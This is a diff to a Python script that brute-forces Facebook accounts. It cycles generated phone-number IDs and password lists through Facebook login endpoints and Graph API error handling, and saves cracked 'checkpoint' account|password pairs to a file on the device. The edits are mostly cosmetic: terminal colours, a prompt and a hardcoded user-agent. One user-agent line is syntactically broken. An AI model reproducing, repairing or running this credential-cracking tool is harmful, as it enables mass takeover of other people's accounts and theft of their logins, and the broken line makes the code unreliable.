@@ -272,7 +272,7 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -315,7 +315,7 @@ def ffb1(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -356,7 +356,7 @@ def ffb3(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -398,7 +398,7 @@ def ffb4(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -471,7 +471,7 @@ def api(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -542,8 +542,8 @@ def api1(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/BRAND-CP🔗.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -586,7 +586,7 @@ def ffb7(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -604,7 +604,7 @@ def bd():
                 pcp=[]
                 clear()
                 pcp.append(f'y')
-                print(' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Code example: \033[1;94m+88016,\033[1;92m+88017,\033[1;95m+88018,\033[1;96m+88019')
+                print(' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Code example: \033[1;94m016,\033[1;92m017,\033[1;95m018,\033[1;96m019')
                 print(f" \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
                 code = input(' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Choose Your Sim Code: ')
                 print(f" \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
@@ -712,7 +712,7 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent': pro}
+			'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41'
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -797,7 +797,7 @@ def apix(ids,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print(f'\r\r\x1b\33[1;91m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open(f'/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
